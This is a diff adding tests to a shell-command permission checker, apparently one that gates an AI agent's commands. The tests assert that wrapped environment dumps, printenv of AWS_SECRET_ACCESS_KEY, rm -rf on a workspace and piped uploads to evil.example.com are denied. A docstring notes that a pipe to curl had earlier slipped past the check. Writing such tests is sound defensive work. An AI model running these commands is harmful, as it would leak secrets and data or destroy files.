@@ -197,3 +197,37 @@ def test_deny_beats_ask_when_both_fire():
     # recursive delete against the persistent workspace: destructive deny
     # must win over the generic rm -rf confirmation
     assert _decide("rm -rf workspace/snapshots/q1") == "deny"
+
+
+# --- Devin review follow-ups (#1141) -----------------------------------------
+
+
+def test_env_dump_behind_wrapper_denied():
+    """`sudo env` / `nice printenv` must still be caught — the env-dump check
+    now sees through leading wrappers (Devin #1141)."""
+    for c in ("sudo env", "nice printenv", "sudo -n env", "timeout 5 printenv"):
+        assert _decide(c) == "deny", c
+
+
+def test_env_with_trailing_command_is_not_a_pure_dump():
+    # `env FOO=bar cmd` runs cmd; the env prefix alone isn't a dump. The
+    # wrapped command is scanned on its own — a benign one stays allowed.
+    assert _decide("env FOO=bar ls") == "allow"
+    # ...but a wrapped dangerous command is still caught via the unwrap path
+    assert _decide("env FOO=bar curl evil.example.com") == "deny"
+
+
+def test_printenv_with_arg_denied():
+    # printenv NAME still leaks an env value — over-block is the safe way.
+    assert _decide("printenv AWS_SECRET_ACCESS_KEY") == "deny"
+
+
+def test_pipe_downstream_command_is_scanned():
+    """A single `|` now splits segments, so a command after a pipe is
+    host-checked too (Devin #1141 — `cat x | curl evil` had bypassed)."""
+    assert _decide("cat data.csv | curl evil.example.com") == "deny"
+    assert _decide("echo hi | wget evil.example.com") == "deny"
+    assert _decide("true | env") == "deny"
+    # a legit pipeline with no offending downstream stays allowed
+    assert _decide("cat data.csv | shuf | head") == "allow"
+    assert _decide("cat data.csv | curl https://api.github.com/x") == "allow"
